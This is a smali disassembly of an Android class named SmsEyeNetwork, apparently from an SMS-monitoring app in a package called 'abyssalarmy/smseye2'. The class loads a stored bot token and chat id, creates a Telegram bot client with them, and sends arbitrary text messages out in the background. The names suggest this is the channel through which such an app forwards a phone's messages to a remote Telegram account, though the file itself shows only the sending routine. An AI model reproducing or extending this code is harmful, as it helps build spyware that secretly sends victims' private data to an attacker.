.class public final Labyssalarmy/smseye2/tools/SmsEyeNetwork;
.super Landroidx/lifecycle/ViewModel;
.source "SmsEyeNetwork.kt"


# annotations
.annotation runtime Lkotlin/Metadata;
    d1 = {
        "\u0000(\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0002\u0008\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\u000e\n\u0002\u0008\u0002\n\u0002\u0010\u0002\n\u0002\u0008\u0002\u0008\u0007\u0018\u00002\u00020\u0001B\r\u0012\u0006\u0010\u0002\u001a\u00020\u0003\u00a2\u0006\u0002\u0010\u0004J\u0010\u0010\n\u001a\u00020\u000b2\u0006\u0010\u000c\u001a\u00020\u0008H\u0007R\u000e\u0010\u0005\u001a\u00020\u0006X\u0082\u000e\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0007\u001a\u00020\u0008X\u0082\u0004\u00a2\u0006\u0002\n\u0000R\u000e\u0010\t\u001a\u00020\u0008X\u0082\u0004\u00a2\u0006\u0002\n\u0000\u00a8\u0006\r"
    }
    d2 = {
        "Labyssalarmy/smseye2/tools/SmsEyeNetwork;",
        "Landroidx/lifecycle/ViewModel;",
        "context",
        "Landroid/content/Context;",
        "(Landroid/content/Context;)V",
        "bot",
        "Lcom/pengrad/telegrambot/TelegramBot;",
        "id",
        "",
        "token",
        "sendTextMessage",
        "",
        "message",
        "app_release"
    }
    k = 0x1
    mv = {
        0x1,
        0x6,
        0x0
    }
    xi = 0x30
.end annotation


# static fields
.field public static final $stable:I = 0x8


# instance fields
.field private bot:Lcom/pengrad/telegrambot/TelegramBot;

.field private final id:Ljava/lang/String;

.field private final token:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 0

    return-void
.end method

.method public constructor <init>(Landroid/content/Context;)V
    .locals 2

    const-string v0, "context"

    invoke-static {p1, v0}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullParameter(Ljava/lang/Object;Ljava/lang/String;)V

    .line 15
    invoke-direct {p0}, Landroidx/lifecycle/ViewModel;-><init>()V

    .line 16
    sget-object v0, Labyssalarmy/smseye2/tools/SmsEyeUtils;->Companion:Labyssalarmy/smseye2/tools/SmsEyeUtils$Companion;

    invoke-virtual {v0, p1}, Labyssalarmy/smseye2/tools/SmsEyeUtils$Companion;->getSmsEyeNetworkData(Landroid/content/Context;)Labyssalarmy/smseye2/tools/SmsEyeUtils$SmsEyeNetworkData;

    move-result-object v0

    invoke-virtual {v0}, Labyssalarmy/smseye2/tools/SmsEyeUtils$SmsEyeNetworkData;->getToken()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Labyssalarmy/smseye2/tools/SmsEyeNetwork;->token:Ljava/lang/String;

    .line 17
    sget-object v1, Labyssalarmy/smseye2/tools/SmsEyeUtils;->Companion:Labyssalarmy/smseye2/tools/SmsEyeUtils$Companion;

    invoke-virtual {v1, p1}, Labyssalarmy/smseye2/tools/SmsEyeUtils$Companion;->getSmsEyeNetworkData(Landroid/content/Context;)Labyssalarmy/smseye2/tools/SmsEyeUtils$SmsEyeNetworkData;

    move-result-object p1

    invoke-virtual {p1}, Labyssalarmy/smseye2/tools/SmsEyeUtils$SmsEyeNetworkData;->getId()Ljava/lang/String;

    move-result-object p1

    iput-object p1, p0, Labyssalarmy/smseye2/tools/SmsEyeNetwork;->id:Ljava/lang/String;

    .line 18
    new-instance p1, Lcom/pengrad/telegrambot/TelegramBot;

    invoke-direct {p1, v0}, Lcom/pengrad/telegrambot/TelegramBot;-><init>(Ljava/lang/String;)V

    iput-object p1, p0, Labyssalarmy/smseye2/tools/SmsEyeNetwork;->bot:Lcom/pengrad/telegrambot/TelegramBot;

    return-void
.end method

.method public static final synthetic access$getBot$p(Labyssalarmy/smseye2/tools/SmsEyeNetwork;)Lcom/pengrad/telegrambot/TelegramBot;
    .locals 0

    .line 15
    iget-object p0, p0, Labyssalarmy/smseye2/tools/SmsEyeNetwork;->bot:Lcom/pengrad/telegrambot/TelegramBot;

    return-object p0
.end method

.method public static final synthetic access$getId$p(Labyssalarmy/smseye2/tools/SmsEyeNetwork;)Ljava/lang/String;
    .locals 0

    .line 15
    iget-object p0, p0, Labyssalarmy/smseye2/tools/SmsEyeNetwork;->id:Ljava/lang/String;

    return-object p0
.end method


# virtual methods
.method public final sendTextMessage(Ljava/lang/String;)V
    .locals 7

    const-string v0, "message"

    invoke-static {p1, v0}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullParameter(Ljava/lang/Object;Ljava/lang/String;)V

    .line 23
    :try_start_0
    move-object v0, p0

    check-cast v0, Landroidx/lifecycle/ViewModel;

    invoke-static {v0}, Landroidx/lifecycle/ViewModelKt;->getViewModelScope(Landroidx/lifecycle/ViewModel;)Lkotlinx/coroutines/CoroutineScope;

    move-result-object v1

    invoke-static {}, Lkotlinx/coroutines/Dispatchers;->getIO()Lkotlinx/coroutines/CoroutineDispatcher;

    move-result-object v0

    move-object v2, v0

    check-cast v2, Lkotlin/coroutines/CoroutineContext;

    const/4 v3, 0x0

    new-instance v0, Labyssalarmy/smseye2/tools/SmsEyeNetwork$sendTextMessage$1;

    const/4 v4, 0x0

    invoke-direct {v0, p1, p0, v4}, Labyssalarmy/smseye2/tools/SmsEyeNetwork$sendTextMessage$1;-><init>(Ljava/lang/String;Labyssalarmy/smseye2/tools/SmsEyeNetwork;Lkotlin/coroutines/Continuation;)V

    move-object v4, v0

    check-cast v4, Lkotlin/jvm/functions/Function2;

    const/4 v5, 0x2

    const/4 v6, 0x0

    invoke-static/range {v1 .. v6}, Lkotlinx/coroutines/BuildersKt;->launch$default(Lkotlinx/coroutines/CoroutineScope;Lkotlin/coroutines/CoroutineContext;Lkotlinx/coroutines/CoroutineStart;Lkotlin/jvm/functions/Function2;ILjava/lang/Object;)Lkotlinx/coroutines/Job;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method
